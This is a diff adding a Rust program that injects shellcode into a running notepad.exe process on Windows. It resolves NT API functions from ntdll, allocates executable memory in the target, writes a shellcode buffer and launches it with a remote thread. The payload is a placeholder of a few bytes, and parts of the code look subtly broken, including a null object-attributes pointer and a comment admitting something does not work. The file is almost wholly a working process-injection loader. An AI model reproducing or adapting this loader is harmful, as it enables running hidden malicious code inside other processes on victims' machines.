@@ -1,0 +1,258 @@
+use std::ffi::CString;
+use std::mem::{size_of, transmute};
+use std::ptr::{null, null_mut};
+use std::os::raw::c_void;
+use winapi::shared::ntdef::{InitializeObjectAttributes, NTSTATUS, NULL};
+use winapi::um::errhandlingapi::GetLastError;
+use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
+use winapi::um::winnt::{HANDLE, PAGE_EXECUTE_READWRITE, PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
+use winapi::um::handleapi::CloseHandle;
+use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
+
+fn get_pid(process_name: &str) -> u32{
+    unsafe{
+        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
+        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
+
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snap.is_null(){
+            println!("Error while snapshoting processes : Error : {}",GetLastError());
+            std::process::exit(0);
+        }
+
+        let mut pid = 0;
+
+        let mut result = Process32First(snap, &mut pe) != 0;
+
+        while result{
+
+            let exe_file = CString::from_vec_unchecked(pe.szExeFile
+                .iter()
+                .map(|&file| file as u8)
+                .take_while(|&c| c!=0)
+                .collect::<Vec<u8>>(),
+            );
+
+            if exe_file.to_str().unwrap() == process_name {
+                pid = pe.th32ProcessID;
+                break;
+            }
+            result = Process32Next(snap, &mut pe) !=0;
+        }
+
+        if pid == 0{
+            println!("Unable to get PID for {}: {}",process_name , "PROCESS DOESNT EXISTS");           
+            std::process::exit(0);
+        }
+    
+        CloseHandle(snap);
+        pid
+    }
+}
+
+
+#[repr(C)]
+struct CLIENT_ID {
+    unique_process: *mut c_void,
+    unique_thread: *mut c_void,
+}
+
+
+type NtOpenProcess = unsafe extern "system" fn(
+    process_handle: *mut HANDLE,
+    desired_access: u32,
+    object_attributes: *mut c_void,
+    client_id: *const CLIENT_ID,
+) -> NTSTATUS;
+
+type NtAllocateVirtualMemory = unsafe extern "system" fn(
+    process_handle: HANDLE,
+    base_address: *mut *mut c_void,
+    zero_bits: usize,
+    region_size: *mut usize,
+    allocation_type: u32,
+    protect: u32,
+) -> NTSTATUS;
+
+type NtWriteVirtualMemory = unsafe extern "system" fn(
+    process_handle: HANDLE,
+    base_address: *mut c_void,
+    buffer: *const c_void,
+    size: usize,
+    written: *mut usize,
+) -> NTSTATUS;
+
+type NtCreateThreadEx = unsafe extern "system" fn(
+    thread_handle: *mut HANDLE,
+    desired_access: u32,
+    object_attributes: *mut c_void,
+    process_handle: HANDLE,
+    start_address: *mut c_void,
+    parameter: *mut c_void,
+    create_flags: u32,
+    zero_bits: usize,
+    stack_size: usize,
+    maximum_stack_size: usize,
+    attribute_list: *mut c_void,
+) -> NTSTATUS;
+
+pub fn inject_indirect_syscalls() {
+    let process_name = "notepad.exe";
+
+    let pid: u32 = get_pid(process_name);
+    let mut process_handle: HANDLE = null_mut();
+
+    // Initialize Object Attributes
+    let object_attributes: *mut winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::ptr::null_mut();
+    unsafe { InitializeObjectAttributes(object_attributes, null_mut(), 0, null_mut(), null_mut()) };
+
+    // Set up CLIENT_ID
+    // looks like this does not work !
+
+    let client_id = CLIENT_ID {
+        unique_process: pid as usize as *mut c_void,
+        unique_thread: null_mut(),
+    };
+
+
+
+    // Load ntdll.dll
+    
+    let ntdll = unsafe { 
+        let string = CString::new("ntdll.dll").unwrap();
+        GetModuleHandleA(string.as_ptr()) 
+    };
+    
+    if ntdll.is_null() {
+        eprintln!("Failed to load ntdll.dll");
+        return;
+    }
+
+    // Get function pointers for NT APIs
+    let nt_open_process: NtOpenProcess = unsafe {
+        let func = GetProcAddress(ntdll, CString::new("NtOpenProcess").unwrap().as_ptr());
+        if func.is_null() {
+            eprintln!("Failed to get NtOpenProcess address");
+            return;
+        }
+        transmute(func)
+    };
+
+    let nt_allocate_virtual_memory: NtAllocateVirtualMemory = unsafe {
+        let func = GetProcAddress(ntdll, CString::new("NtAllocateVirtualMemory").unwrap().as_ptr());
+        if func.is_null() {
+            eprintln!("Failed to get NtAllocateVirtualMemory address");
+            return;
+        }
+        transmute(func)
+    };
+
+    let nt_write_virtual_memory: NtWriteVirtualMemory = unsafe {
+        let func = GetProcAddress(ntdll, CString::new("NtWriteVirtualMemory").unwrap().as_ptr());
+        if func.is_null() {
+            eprintln!("Failed to get NtWriteVirtualMemory address");
+            return;
+        }
+        transmute(func)
+    };
+
+    let nt_create_thread_ex: NtCreateThreadEx = unsafe {
+        let func = GetProcAddress(ntdll, CString::new("NtCreateThreadEx").unwrap().as_ptr());
+        if func.is_null() {
+            eprintln!("Failed to get NtCreateThreadEx address");
+            return;
+        }
+        transmute(func)
+    };
+
+    // Call NtOpenProcess
+    let status = unsafe {
+        nt_open_process(
+            &mut process_handle as *mut _,
+            PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
+            null_mut(),
+            &client_id as *const _,
+        )
+    };
+
+    if status != 0 {
+        eprintln!("Failed to open target process: 0x{:X}", status);
+        return;
+    }
+
+    println!("Successfully opened process with handle: {:?}", process_handle);
+
+    // Allocate memory for the shellcode
+    let mut base_address: *mut c_void = null_mut();
+    let mut region_size: usize = 4096; // Allocate 4KB
+
+    let alloc_status = unsafe {
+        nt_allocate_virtual_memory(
+            process_handle,
+            &mut base_address,
+            0,
+            &mut region_size,
+            0x1000 | 0x2000, // MEM_COMMIT | MEM_RESERVE
+            PAGE_EXECUTE_READWRITE,
+        )
+    };
+
+    if alloc_status != 0 {
+        eprintln!("Failed to allocate memory: 0x{:X}", alloc_status);
+        return;
+    }
+
+    println!(
+        "Successfully allocated memory at: {:?}, size: {} bytes",
+        base_address, region_size
+    );
+
+    // Write the shellcode to the allocated memory
+    let shellcode: [u8; 328] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff ]; // Replace with your actual shellcode
+    let mut bytes_written: usize = 0;
+
+    let write_status = unsafe {
+        nt_write_virtual_memory(
+            process_handle,
+            base_address,
+            shellcode.as_ptr() as *const c_void,
+            shellcode.len(),
+            &mut bytes_written,
+        )
+    };
+
+    if write_status != 0 {
+        eprintln!("Failed to write shellcode: 0x{:X}", write_status);
+        return;
+    }
+
+    println!(
+        "Successfully wrote shellcode to memory. Bytes written: {}",
+        bytes_written
+    );
+
+    // Execute the shellcode using NtCreateThreadEx
+    let mut thread_handle: HANDLE = null_mut();
+    let thread_status = unsafe {
+        nt_create_thread_ex(
+            &mut thread_handle as *mut _,
+            0x1FFFFF, // All possible thread access rights
+            null_mut(),
+            process_handle,
+            base_address,
+            null_mut(),
+            0,
+            0,
+            0,
+            0,
+            null_mut(),
+        )
+    };
+
+    if thread_status != 0 {
+        eprintln!("Failed to create thread: 0x{:X}", thread_status);
+        return;
+    }
+
+    println!("Shellcode execution thread created successfully!");
+}
